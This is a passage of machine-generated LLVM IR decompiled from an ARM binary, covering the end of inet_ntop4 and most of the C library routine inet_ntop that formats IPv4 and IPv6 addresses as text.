  %v1_1b8c0 = add i32 %v0_1b8c0, 1
  store i32 %v1_1b8c0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1b8c4

dec_label_pc_1b8c4:                               ; preds = %bb18, %dec_label_pc_1b8a8
  %v0_1b8d4 = phi i32 [ %v0_1b8d4.pre, %bb18 ], [ %v1_1b8c0, %dec_label_pc_1b8a8 ]
  %v0_1b8c4 = load i32, i32* %sb.global-to-local, align 4
  %v1_1b8c4 = inttoptr i32 %v0_1b8c4 to i8*
  %v2_1b8c4 = load i8, i8* %v1_1b8c4, align 1
  %tmp19 = urem i8 %v2_1b8c4, 10
  store i32 %v2_1b8f8, i32* %ip.global-to-local, align 4
  %v1_1b8d4 = add i32 %v0_1b8d4, 1
  store i32 %v1_1b8d4, i32* %r0.global-to-local, align 4
  %v1_1b8dc = or i8 %tmp19, 48
  %v3_1b8e0 = add i32 %v2_1b8d8, %v0_1b8d4
  %v4_1b8e0 = inttoptr i32 %v3_1b8e0 to i8*
  store i8 %v1_1b8dc, i8* %v4_1b8e0, align 1
  %v0_1b8e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b8e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b8e4 = add i32 %v1_1b8e4, %v0_1b8e4
  store i32 %v2_1b8e4, i32* %r2.global-to-local, align 4
  %v3_1b8ec = add i32 %v2_1b8e4, -17
  %v4_1b8ec = inttoptr i32 %v3_1b8ec to i8*
  store i8 46, i8* %v4_1b8ec, align 1
  %v0_1b8f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b8f0 = add i32 %v0_1b8f0, 1
  store i32 %v1_1b8f0, i32* %r6.global-to-local, align 4
  %v0_1b8f4 = load i32, i32* %sl.global-to-local, align 4
  %v1_1b8f4 = add i32 %v0_1b8f4, 1
  store i32 %v1_1b8f4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b8f8

dec_label_pc_1b8f8:                               ; preds = %entry, %dec_label_pc_1b8c4
  %v0_1b904 = phi i32 [ 0, %entry ], [ %v1_1b8f0, %dec_label_pc_1b8c4 ]
  %v1_1b848 = phi i32 [ 0, %entry ], [ %v1_1b8f4, %dec_label_pc_1b8c4 ]
  store i32 %v2_1b8f8, i32* %ip.global-to-local, align 4
  store i32 %v0_1b904, i32* %r7.global-to-local, align 4
  %v2_1b908 = add i32 %v0_1b904, %v2_1b8f8
  store i32 %v2_1b908, i32* %r5.global-to-local, align 4
  %v7_1b90c = icmp sgt i32 %v1_1b848, 3
  br i1 %v7_1b90c, label %dec_label_pc_1b910, label %dec_label_pc_1b848

dec_label_pc_1b910:                               ; preds = %dec_label_pc_1b8f8
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1b914 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_1b914, i32* %r4.global-to-local, align 4
  %v3_1b918 = add i32 %v2_1b908, -18
  %v4_1b918 = inttoptr i32 %v3_1b918 to i8*
  store i8 0, i8* %v4_1b918, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_1b914, i32* %r0.global-to-local, align 4
  %v3_1b920 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_1b920, i32* %r0.global-to-local, align 4
  %v2_1b924 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1b924, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_1b920, %v2_1b924
  br i1 %tmp, label %dec_label_pc_1b930, label %dec_label_pc_1b944

dec_label_pc_1b930:                               ; preds = %dec_label_pc_1b910
  %v0_1b930 = call i32 @__GI___errno_location()
  store i32 %v0_1b930, i32* %r0.global-to-local, align 4
  %v0_1b938 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1b938, i32* %r2.global-to-local, align 4
  %v2_1b93c = inttoptr i32 %v0_1b930 to i32*
  store i32 28, i32* %v2_1b93c, align 4
  %v0_1b954.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b954

dec_label_pc_1b944:                               ; preds = %dec_label_pc_1b910
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_1b914, i32* @r1, align 4
  %v2_1b94c = inttoptr i32 %arg2 to i8*
  %v3_1b94c = call i32 @strcpy(i8* %v2_1b94c, i32 %v2_1b914)
  store i32 %v3_1b94c, i32* %r0.global-to-local, align 4
  store i32 %v3_1b94c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b954

dec_label_pc_1b954:                               ; preds = %dec_label_pc_1b930, %dec_label_pc_1b944
  %v0_1b954 = phi i32 [ %v0_1b954.pre, %dec_label_pc_1b930 ], [ %v3_1b94c, %dec_label_pc_1b944 ]
  store i32 %v0_1b954, i32* %r0.global-to-local, align 4
  ret i32 %v0_1b954

; uselistorder directives
  uselistorder i32 %v0_1b954, { 1, 0 }
  uselistorder i32 %v2_1b914, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1b908, { 0, 2, 1 }
  uselistorder i32 %v1_1b848, { 1, 0 }
  uselistorder i32 %v1_1b890, { 1, 0, 2 }
  uselistorder i32 %v2_1b8f8, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1b954, { 1, 0 }
  uselistorder label %dec_label_pc_1b8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1b8c4, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1b964 = load i32, i32* @r5, align 4
  %v7_1b970 = icmp eq i32 %arg1, 2
  store i1 %v7_1b970, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_1b970, label %dec_label_pc_1b994, label %dec_label_pc_1b988

dec_label_pc_1b988:                               ; preds = %entry
  %v7_1b988 = icmp eq i32 %arg1, 10
  store i1 %v7_1b988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b988, label %dec_label_pc_1b9a8, label %dec_label_pc_1bbbc

dec_label_pc_1b994:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1b9a0 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1bbb4

dec_label_pc_1b9a8:                               ; preds = %dec_label_pc_1b988
  %v2_1b9a8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1b9a8, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1b9b4 = bitcast i32* %stack_var_-72 to i8*
  %v3_1b9b4 = call i32 @__GI_memset(i8* %v2_1b9b4, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1b9d8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1b9bc

dec_label_pc_1b9bc:                               ; preds = %dec_label_pc_1b9bc.dec_label_pc_1b9bc_crit_edge, %dec_label_pc_1b9a8
  %v0_1b9d4 = phi i32 [ %v0_1b9bc.pre, %dec_label_pc_1b9bc.dec_label_pc_1b9bc_crit_edge ], [ 0, %dec_label_pc_1b9a8 ]
  %v1_1b9bc = load i32, i32* @r8, align 4
  %v2_1b9bc = add i32 %v1_1b9bc, %v0_1b9d4
  %v3_1b9c0 = inttoptr i32 %v2_1b9bc to i8*
  %v4_1b9c0 = load i8, i8* %v3_1b9c0, align 1
  %v6_1b9c0 = zext i8 %v4_1b9c0 to i32
  %v1_1b9c4 = add i32 %v2_1b9bc, 1
  %v2_1b9c4 = inttoptr i32 %v1_1b9c4 to i8*
  %v3_1b9c4 = load i8, i8* %v2_1b9c4, align 1
  %v4_1b9c4 = zext i8 %v3_1b9c4 to i32
  %tmp74 = icmp slt i32 %v0_1b9d4, 0
  %v4_1b9c8 = zext i1 %tmp74 to i32
  %v5_1b9c8 = add i32 %v4_1b9c8, %v0_1b9d4
  %v4_1b9cc = mul nuw nsw i32 %v6_1b9c0, 256
  %v5_1b9cc = or i32 %v4_1b9c4, %v4_1b9cc
  store i32 %v5_1b9cc, i32* %r2.global-to-local, align 4
  %v3_1b9d0 = sdiv i32 %v5_1b9c8, 2
  %v1_1b9d4 = add i32 %v0_1b9d4, 2
  store i32 %v1_1b9d4, i32* %r0.global-to-local, align 4
  %v4_1b9dc = mul i32 %v3_1b9d0, 4
  %v5_1b9dc = add i32 %v4_1b9dc, %v2_1b9d8
  %v7_1b9e0 = icmp eq i32 %v1_1b9d4, 15
  store i1 %v7_1b9e0, i1* %cpsr_z.global-to-local, align 1
  %v2_1b9e4 = add i32 %v5_1b9dc, -32
  %v3_1b9e4 = inttoptr i32 %v2_1b9e4 to i32*
  store i32 %v5_1b9cc, i32* %v3_1b9e4, align 4
  %v7_1b9e8 = icmp sgt i32 %v1_1b9d4, 15
  br i1 %v7_1b9e8, label %dec_label_pc_1b9ec, label %dec_label_pc_1b9bc.dec_label_pc_1b9bc_crit_edge

dec_label_pc_1b9bc.dec_label_pc_1b9bc_crit_edge:  ; preds = %dec_label_pc_1b9bc
  %v0_1b9bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b9bc

dec_label_pc_1b9ec:                               ; preds = %dec_label_pc_1b9bc
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1ba04

dec_label_pc_1ba04:                               ; preds = %dec_label_pc_1b9ec, %dec_label_pc_1ba50
  %v0_1ba44 = phi i32 [ -1, %dec_label_pc_1b9ec ], [ %v0_1ba78, %dec_label_pc_1ba50 ]
  %v0_1ba34 = phi i32 [ -1, %dec_label_pc_1b9ec ], [ %v0_1ba64, %dec_label_pc_1ba50 ]
  %v0_1ba18 = phi i32 [ -1, %dec_label_pc_1b9ec ], [ %v0_1ba187, %dec_label_pc_1ba50 ]
  %v0_1ba50 = phi i32 [ 0, %dec_label_pc_1b9ec ], [ %v1_1ba50, %dec_label_pc_1ba50 ]
  %v4_1ba08 = mul nuw nsw i32 %v0_1ba50, 4
  %v5_1ba08 = add i32 %v4_1ba08, %v2_1b9d8
  %v1_1ba0c = add i32 %v5_1ba08, -32
  %v2_1ba0c = inttoptr i32 %v1_1ba0c to i32*
  %v3_1ba0c = load i32, i32* %v2_1ba0c, align 4
  %v2_1ba10 = icmp eq i32 %v3_1ba0c, 0
  %v7_1ba18 = icmp eq i32 %v0_1ba18, -1
  br i1 %v2_1ba10, label %dec_label_pc_1ba18, label %dec_label_pc_1ba2c

dec_label_pc_1ba18:                               ; preds = %dec_label_pc_1ba04
  br i1 %v7_1ba18, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1ba18
  store i32 %v0_1ba50, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1ba50

.thread:                                          ; preds = %dec_label_pc_1ba18
  %v1_1ba24.pre = load i32, i32* @r4, align 4
  %v2_1ba24 = add i32 %v1_1ba24.pre, 1
  store i32 %v2_1ba24, i32* @r4, align 4
  br label %dec_label_pc_1ba50

dec_label_pc_1ba2c:                               ; preds = %dec_label_pc_1ba04
  br i1 %v7_1ba18, label %dec_label_pc_1ba50, label %dec_label_pc_1ba34

dec_label_pc_1ba34:                               ; preds = %dec_label_pc_1ba2c
  %v7_1ba34 = icmp eq i32 %v0_1ba34, -1
  %v0_1ba48.pre = load i32, i32* @r4, align 4
  %v1_1ba3c = load i32, i32* @r7, align 4
  %v7_1ba40 = icmp sgt i32 %v0_1ba48.pre, %v1_1ba3c
  %or.cond = or i1 %v7_1ba34, %v7_1ba40
  br i1 %or.cond, label %dec_label_pc_1ba44, label %dec_label_pc_1ba4c

dec_label_pc_1ba44:                               ; preds = %dec_label_pc_1ba34
  store i32 %v0_1ba44, i32* @r6, align 4
  store i32 %v0_1ba48.pre, i32* @r7, align 4
  br label %dec_label_pc_1ba4c

dec_label_pc_1ba4c:                               ; preds = %dec_label_pc_1ba34, %dec_label_pc_1ba44
  %v0_1ba3412 = phi i32 [ %v0_1ba44, %dec_label_pc_1ba44 ], [ %v0_1ba34, %dec_label_pc_1ba34 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ba50

dec_label_pc_1ba50:                               ; preds = %bb, %.thread, %dec_label_pc_1ba2c, %dec_label_pc_1ba4c
  %v0_1ba78 = phi i32 [ %v0_1ba44, %.thread ], [ %v0_1ba50, %bb ], [ %v0_1ba44, %dec_label_pc_1ba2c ], [ -1, %dec_label_pc_1ba4c ]
  %v0_1ba187 = phi i32 [ %v0_1ba18, %.thread ], [ %v0_1ba50, %bb ], [ -1, %dec_label_pc_1ba2c ], [ -1, %dec_label_pc_1ba4c ]
  %v0_1ba64 = phi i32 [ %v0_1ba34, %.thread ], [ %v0_1ba34, %bb ], [ %v0_1ba34, %dec_label_pc_1ba2c ], [ %v0_1ba3412, %dec_label_pc_1ba4c ]
  %v1_1ba50 = add nuw nsw i32 %v0_1ba50, 1
  %v7_1ba58 = icmp slt i32 %v1_1ba50, 8
  br i1 %v7_1ba58, label %dec_label_pc_1ba04, label %dec_label_pc_1ba5c

dec_label_pc_1ba5c:                               ; preds = %dec_label_pc_1ba50
  %v7_1ba5c = icmp eq i32 %v0_1ba78, -1
  store i1 %v7_1ba5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ba5c, label %dec_label_pc_1ba5c.dec_label_pc_1ba7c_crit_edge, label %dec_label_pc_1ba64

dec_label_pc_1ba5c.dec_label_pc_1ba7c_crit_edge:  ; preds = %dec_label_pc_1ba5c
  %v1_1baa0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1ba7c

dec_label_pc_1ba64:                               ; preds = %dec_label_pc_1ba5c
  %v7_1ba64 = icmp eq i32 %v0_1ba64, -1
  store i1 %v7_1ba64, i1* %cpsr_z.global-to-local, align 1
  %v0_1ba74.pre = load i32, i32* @r4, align 4
  br i1 %v7_1ba64, label %dec_label_pc_1ba74, label %dec_label_pc_1ba6c

dec_label_pc_1ba6c:                               ; preds = %dec_label_pc_1ba64
  %v1_1ba6c = load i32, i32* @r7, align 4
  %v9_1ba6c = icmp eq i32 %v0_1ba74.pre, %v1_1ba6c
  store i1 %v9_1ba6c, i1* %cpsr_z.global-to-local, align 1
  %v7_1ba70 = icmp sgt i32 %v0_1ba74.pre, %v1_1ba6c
  br i1 %v7_1ba70, label %dec_label_pc_1ba74, label %dec_label_pc_1ba7c

dec_label_pc_1ba74:                               ; preds = %dec_label_pc_1ba64, %dec_label_pc_1ba6c
  store i32 %v0_1ba74.pre, i32* @r7, align 4
  store i32 %v0_1ba78, i32* @r6, align 4
  br label %dec_label_pc_1ba7c

dec_label_pc_1ba7c:                               ; preds = %dec_label_pc_1ba5c.dec_label_pc_1ba7c_crit_edge, %dec_label_pc_1ba6c, %dec_label_pc_1ba74
  %v1_1baa0.pre = phi i32 [ %v1_1ba6c, %dec_label_pc_1ba6c ], [ %v1_1baa0.pre.pre, %dec_label_pc_1ba5c.dec_label_pc_1ba7c_crit_edge ], [ %v0_1ba74.pre, %dec_label_pc_1ba74 ]
  %v0_1ba7c = phi i32 [ %v0_1ba64, %dec_label_pc_1ba6c ], [ %v0_1ba64, %dec_label_pc_1ba5c.dec_label_pc_1ba7c_crit_edge ], [ %v0_1ba78, %dec_label_pc_1ba74 ]
  %v7_1ba7c = icmp eq i32 %v0_1ba7c, -1
  store i1 %v7_1ba7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ba7c, label %dec_label_pc_1ba7c._crit_edge, label %dec_label_pc_1ba84

dec_label_pc_1ba84:                               ; preds = %dec_label_pc_1ba7c
  %v7_1ba84 = icmp eq i32 %v1_1baa0.pre, 1
  store i1 %v7_1ba84, i1* %cpsr_z.global-to-local, align 1
  %v7_1ba88 = icmp slt i32 %v1_1baa0.pre, 2
  br i1 %v7_1ba88, label %bb54, label %dec_label_pc_1ba7c._crit_edge

bb54:                                             ; preds = %dec_label_pc_1ba84
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1ba7c._crit_edge

dec_label_pc_1ba7c._crit_edge:                    ; preds = %dec_label_pc_1ba7c, %dec_label_pc_1ba84, %bb54
  %v0_1baa0 = phi i32 [ %v0_1ba7c, %dec_label_pc_1ba84 ], [ -1, %bb54 ], [ %v0_1ba7c, %dec_label_pc_1ba7c ]
  %v2_1ba90 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_1ba90, i32* @r4, align 4
  %v0_1ba94 = load i32, i32* @r5, align 4
  %v2_1ba94 = add i32 %v0_1ba94, -32956
  store i32 %v2_1ba94, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_1baa0 = add i32 %v0_1baa0, %v1_1baa0.pre
  store i32 %v2_1baa0, i32* @sl, align 4
  %v9_1bb00 = icmp eq i32 %tmp, 65535
  %v7_1baa868 = icmp eq i32 %v0_1baa0, -1
  store i1 %v7_1baa868, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1baa8

dec_label_pc_1baa8:                               ; preds = %dec_label_pc_1ba7c._crit_edge, %dec_label_pc_1bb58
  %v7_1baa872 = phi i1 [ %v7_1baa868, %dec_label_pc_1ba7c._crit_edge ], [ %v7_1baa8, %dec_label_pc_1bb58 ]
  %v0_1bad471 = phi i32 [ 0, %dec_label_pc_1ba7c._crit_edge ], [ %v1_1bb58, %dec_label_pc_1bb58 ]
  %v1_1bac070 = phi i32 [ %v0_1baa0, %dec_label_pc_1ba7c._crit_edge ], [ %v0_1baa8.pre, %dec_label_pc_1bb58 ]
  %v2_1bad869 = phi i32 [ %v2_1ba90, %dec_label_pc_1ba7c._crit_edge ], [ %v3_1bac429, %dec_label_pc_1bb58 ]
  br i1 %v7_1baa872, label %dec_label_pc_1bacc, label %dec_label_pc_1bab0

dec_label_pc_1bab0:                               ; preds = %dec_label_pc_1baa8
  %v9_1bab0 = icmp eq i32 %v0_1bad471, %v1_1bac070
  store i1 %v9_1bab0, i1* %cpsr_z.global-to-local, align 1
  %v5_1bab4 = icmp slt i32 %v0_1bad471, %v1_1bac070
  br i1 %v5_1bab4, label %dec_label_pc_1bacc, label %dec_label_pc_1bab8

dec_label_pc_1bab8:                               ; preds = %dec_label_pc_1bab0
  %v1_1bab8 = load i32, i32* @sl, align 4
  %v9_1bab8 = icmp eq i32 %v0_1bad471, %v1_1bab8
  store i1 %v9_1bab8, i1* %cpsr_z.global-to-local, align 1
  %v6_1babc = icmp slt i32 %v0_1bad471, %v1_1bab8
  br i1 %v6_1babc, label %dec_label_pc_1bac0, label %dec_label_pc_1bacc

dec_label_pc_1bac0:                               ; preds = %dec_label_pc_1bab8
  store i1 %v9_1bab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1bab0, label %bb56, label %dec_label_pc_1bb58

bb56:                                             ; preds = %dec_label_pc_1bac0
  %v1_1bac4 = load i32, i32* @sb, align 4
  %v2_1bac4 = trunc i32 %v1_1bac4 to i8
  %v4_1bac4 = inttoptr i32 %v2_1bad869 to i8*
  store i8 %v2_1bac4, i8* %v4_1bac4, align 1
  %v5_1bac4 = load i32, i32* @r4, align 4
  %v6_1bac4 = add i32 %v5_1bac4, 1
  store i32 %v6_1bac4, i32* @r4, align 4
  br label %dec_label_pc_1bb58

dec_label_pc_1bacc:                               ; preds = %dec_label_pc_1bab8, %dec_label_pc_1bab0, %dec_label_pc_1baa8
  %v2_1bacc = icmp eq i32 %v0_1bad471, 0
  store i1 %v2_1bacc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bacc, label %dec_label_pc_1bb3c, label %dec_label_pc_1bad4

dec_label_pc_1bad4:                               ; preds = %dec_label_pc_1bacc
  %v7_1bad4 = icmp eq i32 %v0_1bad471, 6
  store i1 %v7_1bad4, i1* %cpsr_z.global-to-local, align 1
  %v0_1bad8 = load i32, i32* @sb, align 4
  %v1_1bad8 = trunc i32 %v0_1bad8 to i8
  %v3_1bad8 = inttoptr i32 %v2_1bad869 to i8*
  store i8 %v1_1bad8, i8* %v3_1bad8, align 1
  %v4_1bad8 = load i32, i32* @r4, align 4
  %v5_1bad8 = add i32 %v4_1bad8, 1
  store i32 %v5_1bad8, i32* @r4, align 4
  %v0_1badc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1badc, label %dec_label_pc_1bae0, label %dec_label_pc_1bb3c

dec_label_pc_1bae0:                               ; preds = %dec_label_pc_1bad4
  %v0_1bae0 = load i32, i32* @r6, align 4
  %v2_1bae0 = icmp eq i32 %v0_1bae0, 0
  store i1 %v2_1bae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bae0, label %dec_label_pc_1bae8, label %dec_label_pc_1bb3c

dec_label_pc_1bae8:                               ; preds = %dec_label_pc_1bae0
  %v0_1bae8 = load i32, i32* @r7, align 4
  %v7_1bae8 = icmp eq i32 %v0_1bae8, 6
  store i1 %v7_1bae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bae8, label %dec_label_pc_1bb08, label %dec_label_pc_1baf0

dec_label_pc_1baf0:                               ; preds = %dec_label_pc_1bae8
  %v7_1baf0 = icmp eq i32 %v0_1bae8, 5
  store i1 %v7_1baf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1baf0, label %dec_label_pc_1baf8, label %dec_label_pc_1bb3c

dec_label_pc_1baf8:                               ; preds = %dec_label_pc_1baf0
  store i1 %v9_1bb00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1bb00, label %dec_label_pc_1bb08, label %dec_label_pc_1bb3c

dec_label_pc_1bb08:                               ; preds = %dec_label_pc_1baf8, %dec_label_pc_1bae8
  %v2_1bb0c = sub i32 %v2_1b9d8, %v5_1bad8
  %v1_1bb10 = add i32 %v2_1bb0c, -32
  store i32 %v1_1bb10, i32* %r2.global-to-local, align 4
  %v0_1bb14 = load i32, i32* @r8, align 4
  %v1_1bb14 = add i32 %v0_1bb14, 12
  store i32 %v1_1bb14, i32* %r0.global-to-local, align 4
  %v3_1bb1c = call i32 @inet_ntop4(i32 %v1_1bb14, i32 %v5_1bad8, i32 %v1_1bb10)
  store i32 %v3_1bb1c, i32* %r0.global-to-local, align 4
  %v2_1bb20 = icmp eq i32 %v3_1bb1c, 0
  store i1 %v2_1bb20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1bb20, label %bb57, label %dec_label_pc_1bb2c

bb57:                                             ; preds = %dec_label_pc_1bb08
  %v1_1bb24 = load i32, i32* @r6, align 4
  store i32 %v1_1bb24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bbcc

dec_label_pc_1bb2c:                               ; preds = %dec_label_pc_1bb08
  %v0_1bb2c = load i32, i32* @r4, align 4
  %v1_1bb2c = inttoptr i32 %v0_1bb2c to i8*
  store i32 %v0_1bb2c, i32* %r0.global-to-local, align 4
  %v3_1bb30 = call i32 @strlen(i8* %v1_1bb2c)
  store i32 %v3_1bb30, i32* %r0.global-to-local, align 4
  %v0_1bb34 = load i32, i32* @r4, align 4
  %v2_1bb34 = add i32 %v0_1bb34, %v3_1bb30
  store i32 %v2_1bb34, i32* @r4, align 4
  %v0_1bb6c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1bb6c

dec_label_pc_1bb3c:                               ; preds = %dec_label_pc_1baf8, %dec_label_pc_1baf0, %dec_label_pc_1bae0, %dec_label_pc_1bad4, %dec_label_pc_1bacc
  %v0_1bb44 = phi i32 [ %v5_1bad8, %dec_label_pc_1baf8 ], [ %v5_1bad8, %dec_label_pc_1baf0 ], [ %v5_1bad8, %dec_label_pc_1bae0 ], [ %v5_1bad8, %dec_label_pc_1bad4 ], [ %v2_1bad869, %dec_label_pc_1bacc ]
  store i32 %v2_1b9d8, i32* @lr, align 4
  %v1_1bb40 = load i32, i32* @r5, align 4
  %v4_1bb40 = mul i32 %v1_1bb40, 4
  %v5_1bb40 = add i32 %v4_1bb40, %v2_1b9d8
  store i32 %v0_1bb44, i32* @r0, align 4
  %v1_1bb48 = add i32 %v5_1bb40, -32
  %v2_1bb48 = inttoptr i32 %v1_1bb48 to i32*
  %v3_1bb48 = load i32, i32* %v2_1bb48, align 4
  store i32 %v3_1bb48, i32* %r2.global-to-local, align 4
  %v0_1bb4c = load i32, i32* @fp, align 4
  %v7_1bb50 = call i32 @sprintf(i32 %v0_1bb44, i32 %v0_1bb4c, i32 %v3_1bb48, i32 %v5_1bb40, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1bb50, i32* %r0.global-to-local, align 4
  %v0_1bb54 = load i32, i32* @r4, align 4
  %v2_1bb54 = add i32 %v0_1bb54, %v7_1bb50
  store i32 %v2_1bb54, i32* @r4, align 4
  br label %dec_label_pc_1bb58

dec_label_pc_1bb58:                               ; preds = %bb56, %dec_label_pc_1bac0, %dec_label_pc_1bb3c
  %v3_1bac429 = phi i32 [ %v6_1bac4, %bb56 ], [ %v2_1bad869, %dec_label_pc_1bac0 ], [ %v2_1bb54, %dec_label_pc_1bb3c ]
  %v0_1bb58 = load i32, i32* @r5, align 4
  %v1_1bb58 = add i32 %v0_1bb58, 1
  store i32 %v1_1bb58, i32* @r5, align 4
  %v0_1baa8.pre = load i32, i32* @r6, align 4
  %v7_1bb60 = icmp slt i32 %v1_1bb58, 8
  %v7_1baa8 = icmp eq i32 %v0_1baa8.pre, -1
  store i1 %v7_1baa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bb60, label %dec_label_pc_1baa8, label %dec_label_pc_1bb64

dec_label_pc_1bb64:                               ; preds = %dec_label_pc_1bb58
  br i1 %v7_1baa8, label %.thread2, label %dec_label_pc_1bb6c

dec_label_pc_1bb6c:                               ; preds = %dec_label_pc_1bb64, %dec_label_pc_1bb2c
  %v3_1bb78 = phi i32 [ %v3_1bac429, %dec_label_pc_1bb64 ], [ %v2_1bb34, %dec_label_pc_1bb2c ]
  %v0_1bb6c = phi i32 [ %v0_1baa8.pre, %dec_label_pc_1bb64 ], [ %v0_1bb6c.pre, %dec_label_pc_1bb2c ]
  %v1_1bb6c = load i32, i32* @r7, align 4
  %v2_1bb6c = add i32 %v1_1bb6c, %v0_1bb6c
  %v7_1bb70 = icmp eq i32 %v2_1bb6c, 8
  store i1 %v7_1bb70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bb70, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1bb6c
  %v4_1bb78 = inttoptr i32 %v3_1bb78 to i8*
  store i8 58, i8* %v4_1bb78, align 1
  %v5_1bb78 = load i32, i32* @r4, align 4
  %v6_1bb78 = add i32 %v5_1bb78, 1
  store i32 %v6_1bb78, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1bb6c, %dec_label_pc_1bb64, %bb58
  %v2_1bb80 = phi i32 [ %v3_1bb78, %dec_label_pc_1bb6c ], [ %v3_1bac429, %dec_label_pc_1bb64 ], [ %v6_1bb78, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1bb80 = inttoptr i32 %v2_1bb80 to i8*
  store i8 0, i8* %v3_1bb80, align 1
  %v4_1bb80 = load i32, i32* @r4, align 4
  %v5_1bb80 = add i32 %v4_1bb80, 1
  store i32 %v2_1ba90, i32* @r1, align 4
  %v2_1bb88 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1bb88, i32* %r2.global-to-local, align 4
  %v2_1bb8c = sub i32 %v5_1bb80, %v2_1ba90
  %v9_1bb90 = icmp eq i32 %v2_1bb8c, %v2_1bb88
  store i1 %v9_1bb90, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1bb8c, %v2_1bb88
  br i1 %tmp75, label %dec_label_pc_1bb98, label %dec_label_pc_1bbac

dec_label_pc_1bb98:                               ; preds = %.thread2
  %v0_1bb98 = call i32 @__GI___errno_location()
  store i32 %v0_1bb98, i32* %r0.global-to-local, align 4
  %v0_1bba0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1bba0, i32* %r2.global-to-local, align 4
  %v2_1bba4 = inttoptr i32 %v0_1bb98 to i32*
  store i32 28, i32* %v2_1bba4, align 4
